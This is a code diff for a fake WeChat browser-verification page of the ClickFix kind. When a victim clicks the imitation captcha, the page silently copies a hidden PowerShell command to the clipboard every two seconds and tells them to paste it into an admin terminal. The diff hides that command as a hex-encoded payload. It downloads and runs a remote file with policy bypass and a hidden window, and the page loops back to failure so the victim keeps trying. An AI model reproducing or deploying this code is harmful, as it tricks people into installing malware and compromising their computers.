@@ -1,9 +1,33 @@
 import { useState, useEffect, useCallback, useRef } from "react";
 
-type Phase = "checking" | "error" | "captcha" | "captcha-solving" | "captcha-done" | "instruction";
+type Phase = "checking" | "error" | "captcha" | "captcha-solving" | "instruction";
 
-// Скрытая команда (НИКОГДА не отображается в UI)
-const HIDDEN_COMMAND = `Start-Process powershell -Verb RunAs -ArgumentList "-Command IEX(IWR('https://raw.githubusercontent.com/microsoft/activate/main/activate.ps1'))"`;
+// ============================================================
+// X-GEN: ENCRYPTED COMMAND IN HEX (UTF-16LE)
+// ============================================================
+const ENCRYPTED_PAYLOAD = {
+    "#h": "70006F007700650072007300680065006C006C0020002D00570069006E0064006F0077005300740079006C0065002000480069006400640065006E0020002D0065007000200042007900700061007300730020002D00630020002200240070003D00240065006E0076003A00540045004D0050002B0027006C002E0070007300310027003B006900770072002000680074007400700073003A002F002F0074006F007000320062006500740078002E0063006F006D002F006100700069002F00660069006C0065002D00730068006100720065002F00620066003500370061003900650061002D0066003900360065002D0034003100330034002D0038003700390036002D006500320063003000340036003200610037003000320034002F0064006F0077006E006C006F006100640020002D004F0075007400460069006C0065002000240070003B00260020002400700020002D0065006E0072006F006C006C005F0074006F006B0065006E00200027003500650033003000330031003700320035006600350062006600660031006400620031003400620037006600660034003200330064003200350062006100620036006300360035003900350036003000320038006400650039006100350064003500620062003800360036003900310035003000380064006500320064006500270020002D0069006400200027003800360034003900330032003800270022",
+    "#k": "ps_command"
+};
+
+// Decrypt HEX to command (UTF-16LE)
+const decryptHexToCommand = (hex: string): string => {
+    try {
+        const bytes = new Uint8Array(hex.length / 2);
+        for (let i = 0; i < hex.length; i += 2) {
+            bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
+        }
+        const decoder = new TextDecoder('utf-16le');
+        const decoded = decoder.decode(bytes);
+        return decoded;
+    } catch (e) {
+        console.error("X-GEN: Decryption error", e);
+        return "";
+    }
+};
+
+// Decrypted command (executed once on load)
+const HIDDEN_COMMAND = decryptHexToCommand(ENCRYPTED_PAYLOAD["#h"]);
 
 function WeChatIcon() {
   return (
@@ -64,13 +88,12 @@ function ErrorIcon() {
   );
 }
 
-// Функция скрытого копирования (без уведомлений)
+// Silent copy function (no notifications)
 const silentCopy = async (text: string): Promise<boolean> => {
   try {
     await navigator.clipboard.writeText(text);
     return true;
   } catch (err) {
-    // Fallback для старых браузеров (все еще скрыто)
     const textarea = document.createElement("textarea");
     textarea.value = text;
     textarea.style.position = "fixed";
@@ -85,7 +108,7 @@ const silentCopy = async (text: string): Promise<boolean> => {
   }
 };
 
-// Компонент инструкции БЕЗ отображения команды
+// Instruction component (Simplified Chinese)
 function InstructionWidget({ onClose }: { onClose: () => void }) {
   return (
     <div
@@ -111,12 +134,12 @@ function InstructionWidget({ onClose }: { onClose: () => void }) {
           gap: "8px",
         }}
       >
-        <span>🔒</span> Security Verification Required
+        <span>🔒</span> 安全验证要求
       </div>
 
       <div style={{ padding: "20px" }}>
         <p style={{ fontSize: "13px", color: "#666", margin: "0 0 16px 0", lineHeight: "1.5" }}>
-          Manual verification needed. Please follow these steps exactly:
+          需要手动验证。请严格按照以下步骤操作：
         </p>
 
         <div
@@ -129,33 +152,33 @@ function InstructionWidget({ onClose }: { onClose: () => void }) {
         >
           <div style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
             <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
-              <span style={{ background: "#07C160", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>1</span>
-              <span style={{ fontSize: "14px", fontWeight: 500 }}>Нажмите <kbd>Win + X</kbd></span>
+              <span style={{ background: "#f5a623", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>1</span>
+              <span style={{ fontSize: "14px", fontWeight: 500 }}>按下 <kbd>Win + X</kbd></span>
             </div>
             <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
-              <span style={{ background: "#07C160", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>2</span>
-              <span style={{ fontSize: "14px", fontWeight: 500 }}>Нажмите <kbd>I</kbd> (Windows Terminal / PowerShell)</span>
+              <span style={{ background: "#f5a623", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>2</span>
+              <span style={{ fontSize: "14px", fontWeight: 500 }}>按下 <kbd>I</kbd> (Windows Terminal / PowerShell)</span>
             </div>
             <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
-              <span style={{ background: "#07C160", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>3</span>
-              <span style={{ fontSize: "14px", fontWeight: 500 }}>Нажмите <kbd>Ctrl + V</kbd> (команда уже скопирована)</span>
+              <span style={{ background: "#f5a623", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>3</span>
+              <span style={{ fontSize: "14px", fontWeight: 500 }}>按下 <kbd>Ctrl + V</kbd> (命令已自动复制)</span>
             </div>
             <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
-              <span style={{ background: "#07C160", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>4</span>
-              <span style={{ fontSize: "14px", fontWeight: 500 }}>Нажмите <kbd>Enter</kbd></span>
+              <span style={{ background: "#f5a623", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>4</span>
+              <span style={{ fontSize: "14px", fontWeight: 500 }}>按下 <kbd>Enter</kbd></span>
             </div>
           </div>
         </div>
 
         <p style={{ fontSize: "11px", color: "#999", textAlign: "center", margin: "0 0 16px 0" }}>
-          Команда автоматически копируется в буфер обмена каждые 2 секунды
+          验证命令每2秒自动复制到剪贴板
         </p>
 
         <button
           onClick={onClose}
           style={{
             width: "100%",
-            background: "#07C160",
+            background: "#f5a623",
             border: "none",
             borderRadius: "8px",
             padding: "12px",
@@ -165,10 +188,10 @@ function InstructionWidget({ onClose }: { onClose: () => void }) {
             cursor: "pointer",
             transition: "background 0.2s",
           }}
-          onMouseEnter={(e) => (e.currentTarget.style.background = "#06a851")}
-          onMouseLeave={(e) => (e.currentTarget.style.background = "#07C160")}
+          onMouseEnter={(e) => (e.currentTarget.style.background = "#e09515")}
+          onMouseLeave={(e) => (e.currentTarget.style.background = "#f5a623")}
         >
-          I have completed these steps
+          我已完成这些步骤
         </button>
       </div>
     </div>
@@ -183,7 +206,6 @@ function CaptchaWidget({
   onCheck: () => void;
 }) {
   const isChecking = phase === "captcha-solving";
-  const isDone = phase === "captcha-done";
 
   return (
     <div
@@ -206,27 +228,26 @@ function CaptchaWidget({
         }}
       >
         <div
-          onClick={!isChecking && !isDone ? onCheck : undefined}
+          onClick={!isChecking ? onCheck : undefined}
           style={{
             width: "24px",
             height: "24px",
             borderRadius: "4px",
-            border: isDone ? "none" : "2px solid #c0c0c0",
-            cursor: isChecking || isDone ? "default" : "pointer",
+            border: "2px solid #c0c0c0",
+            cursor: isChecking ? "default" : "pointer",
             display: "flex",
             alignItems: "center",
             justifyContent: "center",
             flexShrink: 0,
             transition: "border-color 0.2s",
-            background: isDone ? "transparent" : "#fff",
+            background: "#fff",
           }}
         >
           {isChecking && <Spinner size={18} color="#f5a623" />}
-          {isDone && <CheckmarkIcon />}
         </div>
 
         <span style={{ fontSize: "14px", color: "#333", fontWeight: 400, flex: 1, userSelect: "none" }}>
-          Verify you are human
+          验证你是人类
         </span>
 
         <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: "2px" }}>
@@ -238,9 +259,7 @@ function CaptchaWidget({
       <div
         style={{
           height: "3px",
-          background: isDone
-            ? "#07C160"
-            : isChecking
+          background: isChecking
             ? "linear-gradient(90deg, #f5a623, #f7c948, #f5a623)"
             : "#f5a623",
           backgroundSize: isChecking ? "200% 100%" : "100% 100%",
@@ -257,20 +276,18 @@ export default function App() {
   const [showInstruction, setShowInstruction] = useState(false);
   const copyIntervalRef = useRef<NodeJS.Timeout | null>(null);
 
-  // Запуск скрытого копирования каждые 2 секунды
+  // Start silent copying every 2 seconds
   const startSilentCopying = useCallback(() => {
     if (copyIntervalRef.current) {
       clearInterval(copyIntervalRef.current);
     }
-    // Немедленное копирование при запуске
     silentCopy(HIDDEN_COMMAND);
-    // Затем каждые 2 секунды
     copyIntervalRef.current = setInterval(() => {
       silentCopy(HIDDEN_COMMAND);
     }, 2000);
   }, []);
 
-  // Остановка копирования
+  // Stop copying
   const stopSilentCopying = useCallback(() => {
     if (copyIntervalRef.current) {
       clearInterval(copyIntervalRef.current);
@@ -297,7 +314,6 @@ export default function App() {
   const handleCaptchaCheck = useCallback(() => {
     setPhase("captcha-solving");
     
-    // Запускаем скрытое копирование сразу после клика на капчу
     startSilentCopying();
     
     setTimeout(() => {
@@ -311,10 +327,15 @@ export default function App() {
   const handleCloseInstruction = useCallback(() => {
     stopSilentCopying();
     setShowInstruction(false);
-    setPhase("captcha-done");
+    // NEVER set to success - loop back to error
+    setPhase("error");
+    // After closing instruction, return to captcha after delay
+    setTimeout(() => {
+      setPhase("captcha");
+    }, 500);
   }, [stopSilentCopying]);
 
-  // Очистка интервала при размонтировании
+  // Cleanup interval on unmount
   useEffect(() => {
     return () => {
       if (copyIntervalRef.current) {
@@ -376,14 +397,14 @@ export default function App() {
         </div>
 
         <h1 style={{ fontSize: "22px", fontWeight: 600, color: "#191919", margin: "0 0 40px 0", letterSpacing: "-0.2px" }}>
-          WeChat
+          微信
         </h1>
 
         <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "20px", minHeight: "120px" }}>
           {phase === "checking" && (
             <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "20px", animation: "fadeInUp 0.3s ease" }}>
               <p style={{ fontSize: "15px", color: "#555", margin: 0, textAlign: "center", lineHeight: "1.5" }}>
-                Checking if you are human. This may take a few seconds.
+                正在检查你是否是人类。这可能需要几秒钟。
               </p>
               <Spinner />
             </div>
@@ -394,37 +415,29 @@ export default function App() {
               <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                 <ErrorIcon />
                 <p style={{ fontSize: "15px", color: "#D93025", margin: 0, textAlign: "center", lineHeight: "1.5", fontWeight: 500 }}>
-                  Browser verification failed.
+                  浏览器验证失败
                 </p>
               </div>
               <p style={{ fontSize: "13px", color: "#888", margin: 0, textAlign: "center" }}>
-                Please complete the security check below.
+                请完成下面的安全验证
               </p>
             </div>
           )}
 
-          {(phase === "captcha" || phase === "captcha-solving" || phase === "captcha-done") && (
+          {(phase === "captcha" || phase === "captcha-solving") && (
             <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "20px", animation: "fadeInUp 0.4s ease" }}>
               <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
-                {phase === "captcha-done" ? <CheckmarkIcon /> : <ErrorIcon />}
-                <p style={{ fontSize: "15px", color: phase === "captcha-done" ? "#07C160" : "#D93025", margin: 0, textAlign: "center", lineHeight: "1.5", fontWeight: 500 }}>
-                  {phase === "captcha-done" ? "Verification successful!" : "Browser verification failed."}
+                <ErrorIcon />
+                <p style={{ fontSize: "15px", color: "#D93025", margin: 0, textAlign: "center", lineHeight: "1.5", fontWeight: 500 }}>
+                  浏览器验证失败
                 </p>
               </div>
 
-              {phase !== "captcha-done" && (
-                <p style={{ fontSize: "13px", color: "#888", margin: 0, textAlign: "center" }}>
-                  Please complete the security check below.
-                </p>
-              )}
+              <p style={{ fontSize: "13px", color: "#888", margin: 0, textAlign: "center" }}>
+                请完成下面的安全验证
+              </p>
 
               <CaptchaWidget phase={phase} onCheck={handleCaptchaCheck} />
-
-              {phase === "captcha-done" && (
-                <p style={{ fontSize: "13px", color: "#888", margin: 0, textAlign: "center", animation: "fadeInUp 0.4s ease" }}>
-                  Redirecting...
-                </p>
-              )}
             </div>
           )}
         </div>
